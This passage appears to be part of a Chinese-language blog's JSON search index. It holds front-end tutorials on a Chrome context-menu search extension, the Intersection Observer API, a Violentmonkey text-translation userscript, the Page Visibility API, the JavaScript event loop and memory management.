sendResponse) =&gt; { if (data.menuItemId) { switch (data.menuItemId) { case 'bing': url = 'https://cn.bing.com/search?q='; break; case '360': url = 'https://www.so.com/s?q='; break; case 'sogou': url = 'https://sogou.com/web?query='; break; case 'google': url = 'https://www.google.com/search?q='; break; default: url = 'https://www.baidu.com/s?wd='; } window.open(data.selectionText ? url + data.selectionText : new URL(url).origin); } }); 使用 git clone https://github.com/zkrisj/chrome-search.git。 打开扩展程序管理页面。 点击右上角开启开发者模式。 点击 加载已解压的扩展程序。选择第 1 步的文件夹。 效果 完整代码仓库地址 https://github.com/zkrisj/chrome-search ","link":"https://zkrisj.github.io/post/chrome-ye-mian-you-jian-cai-dan-sou-suo-kuo-zhan/"},{"title":"⛱ HTML 元素的交叉区域检测","content":"🌃 介绍 有时我们需要观察元素是否可见，来进行一些操作。随着互联网的发展，这种需求却与日俱增，比如，下面这些情况都需要用到相交检测： 图片懒加载——当图片滚动到可见时才进行加载 内容无限滚动——也就是用户滚动到接近内容底部时直接加载更多，而无需用户操作翻页，给用户一种网页可以无限滚动的错觉 检测广告的曝光情况——为了计算广告收益，需要知道广告元素的曝光情况 在用户看见某个区域时执行任务或播放动画 过去，要检测一个元素是否可见或者两个元素是否相交并不容易，很多解决办法不可靠或性能很差。例如，相交检测通常要用到事件监听，并且需要频繁调用 Element.getBoundingClientRect() 方法以获取相关元素的边界信息。事件监听和调用 Element.getBoundingClientRect() 都是在主线程上运行，因此频繁触发、调用可能会造成性能问题。这种检测方法极其怪异且不优雅。 Intersection Observer API 用于检测目标元素与祖先元素或 viewport 相交情况变化，它可以自动&quot;观察&quot;元素是否可见，可见（visible）的本质是，目标元素与视口产生一个交叉区，所以这个 API 叫做&quot;交叉观察器&quot;。 Intersection Observer API 会注册一个回调函数，每当被监视的元素进入或者退出另外一个元素时 (或者 viewport )，或者两个元素的相交部分大小发生变化时，该回调方法会被触发执行。这样，我们网站的主线程不需要再为了监听元素相交而辛苦劳作，浏览器会自行优化元素相交管理。 Intersection Observer API 无法提供重叠的像素个数或者具体哪个像素重叠，常见的使用方式是——当两个元素相交比例在 N% 左右时，触发回调，以执行某些逻辑。 接口 IntersectionObserver const observer = new IntersectionObserver(callback); const observer = new IntersectionObserver(callback, options); // 开始观察 observer.observe(elementA); observer.observe(elementB); // 停止观察 observer.unobserve(element); // 关闭观察器 observer.disconnect(); // 相交信息对象的数组 observer.takeRecords() callback 当元素可见比例超过指定阈值后，就会调用观察器的回调函数 callback，一般会触发两次。一次是目标元素刚刚进入视口（开始可见），另一次是完全离开视口（开始不可见）。此回调函数接受两个参数： entries 一个 IntersectionObserverEntry 对象的数组，例如，如果同时有两个被观察的对象的可见性发生变化，entries 数组就会有两个成员。 observer 被调用的 IntersectionObserver 实例。 options threshold 可以是单一的 number 也可以是 number 数组，target 元素和 root 元素相交程度达到该值的时候 IntersectionObserver 注册的回调函数将会被执行。如果你只是想要探测当 target 元素的在 root 元素中的可见性超过 50% 的时候，你可以指定该属性值为 0.5。如果你想要 target 元素在 root 元素的可见程度每超过 25% 或者减少 25% 就执行一次回调，那么你可以指定一个数组 [0, 0.25, 0.5, 0.75, 1]。默认值是 0 (意味着只要有一个 target 像素出现在 root 元素中，回调函数将会被执行)。该值为 1.0 含义是当 target 完全出现在 root 元素中时候 回调才会被执行。 root 指定根 (root) 元素，用于检查目标的可见性。必须是目标元素的父级元素。如果未指定或者为 null，则默认为浏览器视窗。 rootMargin 根 (root) 元素的外边距。这组值用于在计算交点之前增大或缩小根元素边界框的每一侧。类似于 CSS 中的 margin 属性，比如 &quot;10px 20px 30px 40px&quot; (top, right, bottom, left)。也可以使用百分比来取值。默认值为 0。在执行回调函数时可由 IntersectionObserverEntry.rootBounds 得到。 IntersectionObserverEntry 描述了目标元素与其根元素容器在某一时刻的交集。可以通过调用 IntersectionObserver.takeRecords() 来获取。 属性 boundingClientRect 只读 目标元素的矩形区域的信息，计算方式与 Element.getBoundingClientRect() 相同。 intersectionRatio 只读 目标元素的可见比例，即 intersectionRect 占 boundingClientRect 的比例，完全可见时为 1，完全不可见时小于等于 0。 intersectionRect 只读 根和目标元素的相交区域。与 Element.getBoundingClientRect() 数据结构相同。 isIntersecting 只读 如果目标元素与交叉区域观察者对象的根相交，则返回 true，即变换是从非交叉状态到交叉状态; 如果返回 false, 变换是从交叉状态到非交叉状态。 rootBounds 只读 根元素的矩形区域的信息，getBoundingClientRect(root) 方法的返回值，如果没有根元素（即直接相对于视口滚动），则返回 null。 target 只读 观察的目标元素。 time 只读 返回交叉被触发时的时间戳。 注意：所有区域均被 Intersection Observer API 当做一个矩形看待。如果元素是不规则的图形也将会被看成一个包含元素所有区域的最小矩形，相似的，如果元素发生的交集部分不是一个矩形，那么也会被看作是一个包含他所有交集区域的最小矩形。上述解释有助于理解 IntersectionObserverEntry 提供的属性。 方法 此接口没有方法。 使用 创建一个 IntersectionObserver 对象，并传入相应参数和回调用函数，该回调函数将会在目标 (target) 元素和根 (root) 元素的交集大小超过阈值 (threshold) 规定的大小时候被执行。 const options = { root: document.querySelector('#scrollArea'), rootMargin: '0px', threshold: 1.0 } const observer = new IntersectionObserver(callback, options); 阈值为 1.0 意味着目标元素完全出现在 root 选项指定的元素中可见时，回调函数将会被执行。 创建一个 observer 后需要给定一个目标元素进行观察。 const target = document.querySelector('#listItem'); observer.observe(target); 注意：如果指定了 root 选项，则目标必须是根元素的后代。 只要目标满足为 IntersectionObserver 指定的 threshold 阈值，就会调用回调。回调接收 IntersectionObserverEntry 对象和观察者的列表： const callback =(entries, observer) =&gt; { entries.forEach(entry =&gt; { // Each entry describes an intersection change for one observed target element: // entry.boundingClientRect // entry.intersectionRatio // entry.intersectionRect // entry.isIntersecting // entry.rootBounds // entry.target // entry.time }); }; 注意：注册的回调函数将会在主线程中被执行。所以该函数执行速度要尽可能的快。如果有一些耗时的操作需要执行，建议使用 Window.requestIdleCallback() 方法。 懒加载（lazy load） 有时，我们希望某些静态资源（比如图片），只有用户向下滚动，它们进入视口时才加载，这样可以节省带宽，提高网页性能。 const observer = new IntersectionObserver( function(changes) { changes.forEach(function(change) { const container = change.target; const content = container.querySelector('template').content; container.appendChild(content); observer.unobserve(container); }); } ); document.querySelectorAll('.lazy-loaded').forEach(function (item) { observer.observe(item); }); 上面代码中，只有目标区域可见时，才会将模板内容插入真实 DOM，从而加载静态资源。 无限滚动（infinite scroll） 一旦页尾栏可见，就表示用户到达了页面底部，从而加载新的条目放在页尾栏前面。 const intersectionObserver = new IntersectionObserver( function (entries) { // 如果不可见，就返回 if (entries[0].intersectionRatio &lt;= 0) return; loadItems(10); console.log('Loaded new items'); }); // 开始观察 intersectionObserver.observe( document.querySelector('.scrollerFooter') ); 示例1 以下的例子，每一个 box 的四个边角都会显示自身在根元素中的可见程度百分比，所以在你滚动根元素的时候你将会看到四个边角的数值一直在发生变化。每一个 box 都有不同的 thresholds： 第一个盒子的 thresholds 数组是 [0.00, 0.01, 0.02, ..., 0.99, 1.00]。 第二个盒子只有唯一的值 [0.5]。 第三个盒子的 thresholds 按 10% 从 0 递增 (0%, 10%, 20%, etc.)。 最后一个盒子为 [0, 0.25, 0.5, 0.75, 1.0]。 示例2 同样上下滚动这个页面，查看盒子的背景变化。 ","link":"https://zkrisj.github.io/post/html-yuan-su-de-jiao-cha-qu-yu-jian-ce/"},{"title":"使用 Violentmonkey 做一个划词翻译脚本","content":"用户脚本 用户脚本是一段 JS 代码，能为网站添加新的功能。编写 JS 脚本比 crx 扩展简单得多，不必为了实现一个简单的功能加入其他的文件。 使用用户脚本需要安装一个脚本管理器，最常用的就是油猴（Tampermonkey）或暴力猴（Violentmonkey），Firefox 应用商店、Edge 应用商店或 chrome 应用商店搜索 Tampermonkey 或 Violentmonkey，然后下载安装即可。 如果 chrome 应用商店访问不了先安装下面这个： Tampermonkey vs Violentmonkey 云端备份、导出备份、自动更新、筛选排序这些脚本管理的重要功能，油猴和暴力猴上都有。 Tampermonkey 多了一些定制，编辑工具功能也多一些。 Violentmonkey 安装包体积较小，界面比较清爽一些，设置也比较简单。 Violentmonkey 还多了一个比较实用的功能，为当前网站查找匹配的脚本。 编写脚本 以 Violentmonkey 为例。 新建脚本。首先点击 Violentmonkey 扩展图标上面的 + 号，新建一个脚本。 设置脚本。以 // ==UserScript== 开头，// ==/UserScript== 结尾。下面是一些常用的设置： @namespace 和 @name 组合是发布到脚本网站时，用户脚本的唯一标识符。 @author：脚本的作者。 @version：脚本版本，用于更新发布脚本。 @description：脚本的描述，可以添加命名来国际化，比如 @description:en。 @include、@exclude：脚本应该和不应该运行的页面。允许指定多个。 @require：加载外部脚本的 URL。允许指定多个。 @resource：一些外部静态资源。可以通过 GM_getResourceURL 和 GM_getResourceText 方法访问。 // @resource logo https://my.cdn.com/logo.png // @resource text https://my.cdn.com/some-text.txt @connect：定义允许被 GM_xmlhttpRequest 方法访问的域名。允许指定多个。 @grant：给 GM_* 方法授权并可在脚本执行时使用。如果使用任何特殊 API，则必须明确授予。 // @grant GM_getValue // @grant GM_setValue // @grant GM_setClipboard // @grant GM_openInTab // @grant GM_xmlhttpRequest 除了GM API之外，还可以授予以下权限： // @grant window.close // @grant window.focus // @grant window.onurlchange if (window.onurlchange === null) { // feature is supported window.addEventListener('urlchange', (info) =&gt; ...); } @run-at：定义脚本何时执行。 document-end 默认值 脚本在 DOMContentLoaded 被触发时执行。此时，页面的基本 HTML 已准备就绪，图像等其他资源可能仍在加载中。 document-start 脚本会尽快执行。不能保证脚本在页面中的其他脚本之前执行。在 Greasemonkey v3 中，甚至可以在加载 HTML 之前确保脚本执行，但对于 Violentmonkey 作为 Web 扩展来说这是不可能的。 document-idle 脚本在 DOMContentLoaded 触发后执行。 加入代码。 // ==UserScript== // @name 无需梯子 谷歌划词翻译 translate.google.cn // @namespace https://violentmonkey.github.io // @version 1.13 // @description 基于 translate.google.cn，中译英，英译中，拼音、音标显示 // @license https://www.apache.org/licenses/LICENSE-2.0 // @author zkrisj // @include * // @exclude https://juejin.cn/editor/drafts/* // @exclude https://translate.google.cn/* // @run-at document-end // @connect translate.google.cn // @grant GM_xmlhttpRequest // ==/UserScript== (function() { 'use strict'; // var googleUrl = 'https://translate.google.cn/translate_a/single?client=gtx&amp;dt=t&amp;dt=bd&amp;dj=1&amp;source=input&amp;hl=auto&amp;sl=auto'; // 无需梯子 var googleUrl = 'https://translate.google.cn/_/TranslateWebserverUi/data/batchexecute?&amp;source-path=%2F&amp;rpcids=MkEWBc&amp;soc-app=1&amp;soc-platform=1&amp;soc-device=1&amp;_reqid=632656&amp;rt=c'; var icon = document.createElement('div'); var word = ''; icon.innerHTML = '&lt;svg style=&quot;position: absolute;margin: 4px;&quot; width=&quot;24&quot; height=&quot;24&quot; viewBox=&quot;0 0 768 768&quot;&gt;' + '&lt;path d=&quot;M672 640.5v-417c0-18-13.5-31.5-31.5-31.5h-282l37.5 129h61.5v-33h34.5v33h115.5v33h-40.5c-10.5 40.5-33 79.5-61.5 112.5l87 85.5-22.5 24-87-85.5-28.5 28.5 25.5 88.5-64.5 64.5h225c18 0 31.5-13.5 31.5-31.5zM447 388.5c7.5 15 19.5 34.5 36 54 39-46.5 49.5-88.5 49.5-88.5h-127.5l10.5 34.5h31.5zM423 412.5l19.5 70.5 18-16.5c-15-16.5-27-34.5-37.5-54zM355.5 339c0-7.381-0.211-16.921-3-22.5h-126v49.5h70.5c-4.5 19.5-24 48-67.5 48-42 0-76.5-36-76.5-78s34.5-78 76.5-78c24 0 39 10.5 48 19.5l3 1.5 39-37.5-3-1.5c-24-22.5-54-34.5-87-34.5-72 0-130.5 58.5-130.5 130.5s58.5 130.5 130.5 130.5c73.5 0 126-52.5 126-127.5zM640.5 160.5c34.5 0 63 28.5 63 63v417c0 34.5-28.5 63-63 63h-256.5l-31.5-96h-225c-34.5 0-63-28.5-63-63v-417c0-34.5 28.5-63 63-63h192l28.5 96h292.5z&quot; style=&quot;fill:#3e84f4;&quot;/&gt;&lt;/svg&gt;'; icon.setAttribute('style', 'width:32px;' + 'height:32px;' + 'display:none;' + 'background:#fff;' + 'border-radius:16px;' + 'box-shadow:4px 4px 8px #888;' + 'position:absolute;' + 'z-index:2147483647;'); // 添加翻译图标到 DOM document.documentElement.appendChild(icon); document.addEventListener('mousedown', function(e) { if (e.target == icon || (e.target.parentNode &amp;&amp; e.target.parentNode == icon) || (e.target.parentNode.parentNode &amp;&amp; e.target.parentNode .parentNode == icon)) { // 点击翻译图标时阻止选中的文本消失 e.preventDefault(); } }); // 选中变化事件 document.addEventListener(&quot;selectionchange&quot;, function() { if (!window.getSelection().toString().trim()) { icon.style.display = 'none'; // server.containerDestroy(); } }); // 显示、隐藏翻译图标 document.addEventListener('mouseup', function(e) { if (e.target == icon || (e.target.parentNode &amp;&amp; e.target.parentNode == icon) || (e.target.parentNode.parentNode &amp;&amp; e.target.parentNode .parentNode == icon)) { // 点击了翻译图标 e.preventDefault(); return; } var text = window.getSelection().toString().trim(); if (text &amp;&amp; text.length &lt; 800 &amp;&amp; icon.style.display == 'none') { icon.style.top = e.pageY + 12 + 'px'; icon.style.left = e.pageX + 'px'; icon.style.display = 'block'; } else if (!text) { icon.style.display = 'none'; for (var i = 0; i &lt; server.rendered.length; i++) { // 点击了翻译内容面板 if (e.target == server.rendered[i]) return; // 不再创建翻译图标 } server.containerDestroy(); // 销毁翻译内容面板 } }); // 翻译图标点击事件 icon.addEventListener('click', function(e) { var text = window.getSelection().toString().trim(); if (text) { icon.style.display = 'none'; server.containerDestroy(); // 销毁翻译内容面板 // 新建翻译内容面板 var container = server.container(); container.style.top = e.pageY + 'px'; if (e.pageX + 350 &lt;= document.body.clientWidth) // container 面板css最大宽度为250px container.style.left = e.pageX + 'px'; else container.style.left = document.body.clientWidth - 350 + 'px'; document.body.appendChild(container); server.rendered.push(container); if (isChina(text)) { // ajax(googleUrl + '&amp;tl=en&amp;q=' + encodeURIComponent(text), container); ajax(googleUrl, container, 'POST', &quot;f.req=&quot; + JSON.stringify([[[&quot;MkEWBc&quot;, &quot;[[&quot; + encodeURIComponent(text) + &quot;,'zh-CN','en']]&quot;]]])); } else { // ajax(googleUrl + '&amp;tl=zh&amp;dt=t&amp;q=' + encodeURIComponent(text), container); text = text.replace(/[A-Z][^A-Z ]/g, function(v) { return ' ' + v.toLowerCase() }).replace(/\\p{P}/gu, ' ').replace(/ /g, ' ').trim(); word = text; ajax(googleUrl, container, 'POST', &quot;f.req=&quot; + JSON.stringify([[[&quot;MkEWBc&quot;, &quot;[[&quot; + encodeURIComponent(text) + &quot;,'auto','zh-CN']]&quot;]]])); } } }); function isChina(str) { var reg = /^([\\u4E00-\\u9FA5]|[\\uFF00-\\uFF20]|[\\u3000-\\u301C])+$/; return reg.test(str); } function ajax(url, element, method, data, headers) { if (!method) method = 'GET'; // 因为Tampermonkey跨域访问(a.com)时会自动携带对应域名(a.com)的对应cookie，不会携带当前域名的cookie // 所以，GM_xmlhttpRequest【不存在】cookie跨域访问安全性问题 if (!headers) headers = { &quot;content-type&quot;: &quot;application/x-www-form-urlencoded;charset=UTF-8&quot;, }; GM_xmlhttpRequest({ method: method, url: url, headers: headers, data: data, onload: function(res) { console.log(url, data, res); // google(res.responseText, element); if (res.responseText.startsWith('&lt;!DOCTYPE html&gt;')) { displaycontainer(&quot;获取失败&quot;, element); } else { res = JSON.parse(JSON.parse(res.responseText.match(/^\\)]}'\\n\\n\\d+\\n(\\[\\[.*(?!\\n\\d)\\]\\])/)[1])[0][2]); var phonetic = res[0][0] ? res[0][0] + &quot;\\r\\n&quot; : &quot;&quot;; var translation = res[1][0][0][5][0][0]; if (res[3] &amp;&amp; word === res[3][0] &amp;&amp; res[3][5] &amp;&amp; res[3][5][0] &amp;&amp; res[3][5][0][0] &amp;&amp; res[3][5][0][0][1] &amp;&amp; res[3][5][0][0][1][0]) translation = res[3][5][0][0][1][0][0]; displaycontainer(phonetic.toLowerCase() + translation, element); } }, onerror: function(res) { displaycontainer(&quot;连接失败&quot;, element); } }); } function google(rst, element) { var json = JSON.parse(rst), html = ''; console.log(json); for (var i = 0; i &lt; json.sentences.length; i++) { html += json.sentences[i].trans; } displaycontainer(html, element); // console.log(word, html, element); } function displaycontainer(text, element) { element.textContent = text; element.style.display = 'block'; // 显示结果 } var server = { // 存放已经生成的翻译内容面板（销毁的时候用） rendered: [], // 销毁已经生成的翻译内容面板 containerDestroy: function() { for (var i = this.rendered.length - 1; i &gt;= 0; i--) { if (this.rendered[i] &amp;&amp; this.rendered[i].parentNode) { this.rendered[i].parentNode.removeChild(this.rendered[i]); } } }, // 生成翻译结果面板 DOM （此时还未添加到页面） container: function() { var pre = document.createElement('pre'); pre.setAttribute('style', 'display:none;' + 'position:absolute;' + 'font-size:13px;' + 'overflow:auto;' + 'background:#fff;' + 'font-family:sans-serif,Arial;' + 'font-weight:normal;' + 'text-align:left;' + 'color:#000;' + 'padding:0.5em 1em;' + 'line-height:1.5em;' + 'border-radius:5px;' + 'border:1px solid #ccc;' + 'box-shadow:4px 4px 8px #888;' + 'max-width:350px;' + 'max-height:216px;' + 'z-index:2147483647;'); return pre; } }; })(); 如果自己使用，不需要分享给其他人，下面步骤就省了。 GreasyFork 上面发布。没有注册需要先注册。 脚本地址：谷歌划词翻译 translate.google.cn，谷歌划词翻译 translate.googleapis.com ","link":"https://zkrisj.github.io/post/shi-yong-violentmonkey-zuo-yi-ge-hua-ci-fan-yi-jiao-ben/"},{"title":"HTML 的页面可见性","content":"介绍 开发者在过去通常通过监听 blur 和 focus 事件来了解页面是否处于活动状态，虽然 onblur 和 onfocus 会告诉你用户是否切换窗口，但不一定意味着它是隐藏的。当用户切换选项卡或最小化包含选项卡的浏览器窗口时，页面才会隐藏。 页面可见性可以通过让页面在文档不可见时避免执行不必要的任务，从而来节省资源和提高性能。例如： 网站有图片轮播效果，只有在用户观看轮播的时候，才会自动展示下一张幻灯片。 显示信息仪表盘的应用程序不希望在页面不可见时轮询服务器进行更新。 页面想要检测是否正在渲染，以便可以准确的计算网页浏览量。 网站想要在设备处于待机模式时关闭声音（用户按下电源按钮关闭屏幕）。 网站正在播放视频，它可以在用户将选项卡置于后台时暂停视频，并在用户返回选项卡时恢复播放。 当用户最小化窗口或切换到另一个选项卡时，Document 会发送 visibilitychange 事件，让监听者知道页面状态已更改，然后可以检测事件并执行某些操作。 iframe 的可见性状态与父文档相同。使用 CSS 属性（例如 display: none;）隐藏 iframe 不会触发可见性事件或更改框架中包含的文档的状态。 接口 目前页面可见性 API 有两个属性，一个事件： Document.hidden 已弃用 只读 如果页面处于被认为对用户隐藏的状态，则返回 true，否则返回 false。 Document.visibilityState 只读 指示文档当前可见性状态的字符串。可能的值为： visible 页面内容可能至少部分可见。实际上，这意味着页面是非最小化窗口的前景选项卡。 hidden 该页面的内容对用户不可见，原因可能是文档的选项卡位于背景中，或者是最小化窗口的一部分，或者是因为设备的屏幕已关闭。 prerender 页面内容正在预呈现，用户看不到。一个文档可以从该 prerender 状态开始，但永远不会从任何其他状态切换到该状态，因为一个文档只能预渲染一次。 注意：并非所有浏览器都支持预渲染。 unloaded 该页面正在从内存中卸载。 注意：并非所有浏览器都支持该 unloaded 值。 visibilitychange 当标签的内容变得可见或隐藏时被触发的事件。 示例1 当切换或打开另一个标签时，视频应该暂停，并在返回选项卡时再次播放。这可以降低功耗或停止烦人的背景音频。 &lt;body&gt; &lt;video id=&quot;videoElement&quot; src=&quot;../assets/cat2.mp4&quot; width=&quot;320&quot; height=&quot;240&quot; controls autoplay&gt;&lt;/video&gt; &lt;/body&gt; &lt;script&gt; document.onvisibilitychange = e =&gt; { if (document.visibilityState === 'visible') videoElement.play(); else if (document.visibilityState === 'hidden') videoElement.pause(); } videoElement.addEventListener(&quot;pause&quot;, () =&gt; { document.title = 'Paused'; }, false); videoElement.addEventListener(&quot;play&quot;, () =&gt; { document.title = 'Playing'; }, false); &lt;/script&gt; 示例2 比如以下场景： 打开网站，未登录状态下，进入首页。 然后新窗口打开任意页面，登录成功。 再次访问刚才打开的首页，发现页面还是未登录状态，实际上用户已经登录了。 有了页面可见性 API，我们就可以在步骤 2 设置登录状态，然后在步骤 3 通过 visibilitychange 事件获取登录状态并登录。 &lt;body&gt; &lt;p id=&quot;info&quot;&gt;您尚未登录，请&lt;a href=&quot;login.html&quot; target=&quot;_blank&quot;&gt;登录&lt;/a&gt;&lt;/p&gt; &lt;/body&gt; &lt;script&gt; window.onload = login; document.onvisibilitychange = e =&gt; { if (document.visibilityState === 'visible') login(); } function login() { const { username } = localStorage; if (username) info.textContent = 'Hi, ' + username; else info.innerHTML = '您尚未登录，请&lt;a href=&quot;login.html&quot; target=&quot;_blank&quot;&gt;登录&lt;/a&gt;'; } &lt;/script&gt; 登录页面： &lt;body&gt; &lt;form id=&quot;loginForm&quot; method=&quot;post&quot;&gt; &lt;p&gt;用户名： &lt;input type=&quot;text&quot; name=&quot;username&quot; required&gt; &lt;/p&gt; &lt;p&gt;密码： &lt;input type=&quot;password&quot; name=&quot;password&quot; required&gt; &lt;/p&gt; &lt;p&gt; &lt;input type=&quot;submit&quot;&gt; &lt;/p&gt; &lt;/form&gt; &lt;/body&gt; &lt;script&gt; loginForm.addEventListener('submit', function(e) { localStorage.username = this.username.value; alert('登录成功！回到刚才的页面查看效果！'); this.reset(); e.preventDefault(); }); &lt;/script&gt; ","link":"https://zkrisj.github.io/post/html-de-ye-mian-ke-jian-xing/"},{"title":"理解 JavaScript 的事件循环和并发模型","content":"单线程 先了解一下进程和线程的概念。 进程：CPU 进行资源分配的基本单位，线程：CPU 调度的最小单位。 进程是一个应用的执行程序，线程则是进程内部执行某个部分的程序。 线程完成任务后将结果返回给进程，进程再返回给 CPU 处理。 JavaScript 为什么是单线程？ 因为 JavaScript 是可操纵 DOM 的，如果两个线程同时操作 DOM，那浏览器就无法保证 DOM 数据的一致性了。 在单线程上运行代码非常容易，不必处理多线程环境中出现的复杂场景，例如死锁，但也无法充分发挥计算机的 CPU 计算能力。 与 GUI 渲染线程互斥 如果 JS 引擎线程和 GUI 渲染线程同时运行，初始渲染在修改元素之后完成，那么渲染前后获得的元素数据就不一致了。 当 JS 引擎线程执行时 GUI 会被挂起，GUI更新会被保存在一个队列中等到 JS 引擎线程空闲时执行。 如果 JS 引擎线程正在进行巨量的计算，此时就算 GUI 有更新，也会被保存到队列中等待，就会造成页面的渲染阻塞。 Web Worker 现在浏览器可以使用 Web Worker API 为 JavaScript 创造多线程环境，为主线程（通常是 UI 线程）创建 Worker 线程，并负责一些计算密集型或高延迟的任务。 在 nodeJS 中通过以下方式使用： const { Worker, isMainThread, setEnvironmentData, getEnvironmentData, } = require('worker_threads'); if (isMainThread) { setEnvironmentData('Hello', 'World!'); const worker = new Worker(__filename); } else { console.log(getEnvironmentData('Hello')); // Prints 'World!'. } 工作者（线程）对于执行 CPU 密集型 JavaScript 操作很有用。它们对 I/O 密集型工作没有多大帮助。Node.js 内置的异步 I/O 操作比 Workers 效率更高。 nodeJS 也是单线程吗？ Javascript 代码由 JS 执行线程 V8 执行（是单线程的），I/O（数据交换，通常是磁盘、网络等）操作是有其它线程的。 nodeJS 并没有给 Javascript 执行时创建新线程的能力，所有阻塞操作通过 I/O 线程池来执行，由 Libuv（是一个跨平台的异步 I/O 库，它结合了 UNIX 下的 libev 和 Windows 下的 IOCP 的特性）实现。 调用栈 vs 消息队列 vs 微任务 调用栈：函数调用形成了一个由若干帧组成的先进后出的栈。 消息队列：一个待处理消息的任务队列。每一个消息都关联着一个用以处理这个消息的回调函数。队列和栈是相反的，队列是先进先出的。例如 setTimeout()、setInterval() 和事件触发的回调。消息队列中的任务需要在下一次事件循环迭代开始之后才会被执行。 微任务：ECMAScript 2015 引入了作业队列（微任务）的概念，Promise 使用了该队列（也在 ES2015 引入）。微任务在下一次事件循环开始之前执行。 优先级：调用栈 &gt; 微任务 &gt; 消息队列。 // 调用栈 function func() { console.log(&quot;func&quot;); } // 消息队列 setTimeout(() =&gt; { console.log(&quot;setTimeout&quot;); }); const p = new Promise((resolve, reject) =&gt; { // 调用栈 console.log(&quot;Promise&quot;); resolve(); }); // 微任务 p.then(() =&gt; { console.log(&quot;then&quot;); }); func(); /* 打印结果： Promise func then setTimeout */ 事件循环 不断地检查调用栈，按顺序执行这些任务，直到调用栈为空； 之后，微任务将被执行，直到微任务队列为空； 然后浏览器可能会选择更新渲染； 开始下一轮循环。消息队列中的任务会放在下次循环中执行。 事件循环不一定对应于实现线程。例如，可以在单个线程中协同调度多个窗口事件循环。 为了协调事件、用户交互、脚本、渲染、网络等，浏览器必须使用事件循环。由单独的事件触发线程管理。事件循环既可能是浏览器的主事件循环也可能是被一个 web worker 所驱动的事件循环。分为三种类型： Window 事件循环：驱动所有同源的窗口，不是指同源策略中的源，而是指由同一个窗口打开的多个子窗口或同一个窗口中的多个 iframe 等。 Worker 事件循环：驱动 worker。包括所有种类的 worker：web worker、shared worker 和 service worker。由于 Worker 被放在一个或多个独立于主线程的代理中，浏览器可能会用单个或多个事件循环来处理给定类型的所有 worker。 Worklet 事件循环：驱动运行 worklet 的代理。这包含了 Worklet、AudioWorklet 以及 PaintWorklet。 在特定情况下，同源窗口之间共享事件循环，例如： 如果一个窗口打开了另一个窗口，它们可能共享一个事件循环。 如果窗口是包含在 iframe 中，则它可能会和包含它的窗口共享一个事件循环。 在多进程浏览器中多个窗口碰巧共享了同一个进程。 JavaScript 的事件循环模型与许多其他语言不同的一个特性是：永不阻塞，处理 I/O 时通常通过事件和回调执行，因此当应用程序等待 IndexedDB 查询返回或 XHR 请求返回时，它仍然可以处理其他事情，例如用户输入。由于历史原因有一些例外，如 alert 或者同步 XHR，但应该尽量避免使用它们。 并发模型 JavaScript 的并发模型是基于事件循环的，事件循环负责执行代码、收集和处理事件以及执行队列中的子任务。 nodeJS 也是基于事件循环使用事件驱动和异步 I/O（遇到 I/O 请求不阻塞后面的计算，当 I/O 完成后，以事件的方式通知）的方式，由 V8 引擎提供的异步执行回调接口，通过事件和回调来处理大量的并发的。 浏览器和 nodeJS 基于不同的技术实现了各自的事件循环。 nodeJS 的事件循环是基于 libuv，而浏览器的事件循环模型则在 html5 的规范中明确定义。 ","link":"https://zkrisj.github.io/post/javascript-de-shi-jian-xun-huan-he-bing-fa-mo-xing/"},{"title":"JavaScript 的内存管理","content":"简介 像 C 这样的底层语言一般都有底层的内存管理接口，比如 malloc() 和 free()。相反，JavaScript 是在创建变量（对象，字符串等）时自动进行了分配内存，并且在不使用它们时“自动”释放，释放的过程称为垃圾回收，这种自动化容易造成潜在的混淆——它会给开发人员一种他们不需要担心内存管理的错误印象。 内存生命周期 不管什么程序语言，内存生命周期基本是一致的： 分配你所需要的内存 使用分配到的内存（读、写） 不需要时将其释放\\归还 所有语言第二部分都是明确的。第一和第三部分在低级语言中是明确的，但在像 JavaScript 等高级语言中大多是隐式的。 JavaScript 的内存分配 值的初始化 为了不让开发者费心分配内存，JavaScript 在定义变量时就完成了内存分配。 const n = 123; // 给数值变量分配内存 const s = &quot;azerty&quot;; // 给字符串分配内存 const o = { a: 1, b: null }; // 给对象及其包含的值分配内存 // 给数组及其包含的值分配内存（就像对象一样） const a = [1, null, &quot;abra&quot;]; function f(a){ return a + 2; } // 给函数（可调用的对象）分配内存 // 函数表达式也能分配一个对象 someElement.addEventListener('click', function(){ someElement.style.backgroundColor = 'blue'; }, false); 通过函数调用分配内存 有些函数调用结果是分配对象内存： const d = new Date(); // 分配一个 Date 对象 const e = document.createElement('div'); // 分配一个 DOM 元素 有些方法分配新变量或者新对象： const s = &quot;azerty&quot;; const s2 = s.substr(0, 3); // s2 是一个新的字符串 // 因为字符串是不变量， // JavaScript 可能决定不分配内存， // 只是存储了 [0-3] 的范围。 const a = [&quot;ouais ouais&quot;, &quot;nan nan&quot;]; const a2 = [&quot;generation&quot;, &quot;nan nan&quot;]; const a3 = a.concat(a2); // 新数组有四个元素，是 a 连接 a2 的结果 使用值 使用值的过程实际上是对分配内存进行读取与写入的操作。读取与写入可能是写入一个变量或者一个对象的属性值，甚至传递函数的参数。 不再需要内存时释放 大多数内存管理问题都发生在这个阶段。此阶段最困难的方面是确定何时不再需要分配的内存。 低级语言要求开发人员手动确定程序中的哪个点不再需要分配的内存并释放它。 JavaScript 等高级语言利用一种称为垃圾回收(GC) 的自动内存管理形式。它的主要工作是跟踪内存的分配和使用，以便当分配的内存不再使用时，自动释放它。这只能是一个近似的过程，因为要知道是否仍然需要某块内存是无法判定的（无法通过某种算法解决）。 垃圾回收 如上所述自动查找是否一些内存“不再需要”是无法确定的。因此，垃圾回收只能有限的解决一般问题。下面是一些必要的概念、主要的垃圾回收算法和它们的限制。 引用 垃圾回收算法主要依赖于引用的概念。在内存管理的环境中，一个对象如果有访问另一个对象的权限（隐式或者显式），叫做一个对象引用另一个对象。例如，一个 Javascript 对象具有对它原型的引用（隐式引用）和对它属性的引用（显式引用）。在这里，“对象”的概念不仅特指 JavaScript 对象，还包括函数作用域（或者全局词法作用域）。 引用计数算法 这是最初级的垃圾回收算法。此算法把“对象是否不再需要”简化定义为“对象有没有其他对象引用到它”。如果没有引用指向该对象（零引用），对象将被垃圾回收机制回收。 let o = { a: { b:2 } }; // 两个对象被创建，一个作为另一个的属性被引用，另一个被分配给变量 o // 很显然，没有一个可以被垃圾回收 let o2 = o; // o2 变量是第二个对“这个对象”的引用 o = 1; // 现在，“这个对象”只有一个 o2 变量的引用了，“这个对象”的原始引用 o 已经没有 let oa = o2.a; // 引用“这个对象”的 a 属性 // 现在，“这个对象”有两个引用了，一个是 o2，一个是 oa o2 = &quot;yo&quot;; // 虽然最初的对象现在已经是零引用了，可以被垃圾回收了 // 但是它的属性 a 的对象还在被 